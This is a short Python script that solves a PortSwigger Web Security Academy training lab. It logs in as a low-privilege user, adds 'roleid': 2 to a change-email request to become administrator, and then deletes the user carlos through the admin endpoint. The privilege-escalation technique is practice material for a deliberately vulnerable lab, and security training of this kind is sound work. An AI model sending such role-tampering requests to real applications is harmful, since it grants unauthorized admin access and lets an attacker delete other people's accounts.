# https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
# Lab: User role can be modified in user profile
# Difficulty: APPRENTICE

import requests
from pwn import log

sub = '0a2800b004ce851b802ccc1900250030'
url = f'https://{sub}.web-security-academy.net'

s = requests.session()

def login():
    r = s.post(f'{url}/login', data={'username': 'wiener', 'password': 'peter'})
    log.info(f'Logging in as wiener: {r.status_code}')
    
def exploit():
    # Change roleid to 2 (administrator)
    r = s.post(f'{url}/my-account/change-email', json={'email':'test@mail.com','roleid': 2})
    # print(r.text)
    if r.status_code != 200:
        log.error('Failed to change roleid')
        return
    log.success('Changed roleid to 2')
    
    # Delete the user 'carlos'
    r = s.get(f'{url}/admin/delete?username=carlos')
    
    if r.status_code != 200:
        log.error('Failed to delete user carlos')
        return
    log.success('Deleted user carlos')
    
    # Check if the lab is solved
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')

if __name__ == '__main__':
    login()
    exploit()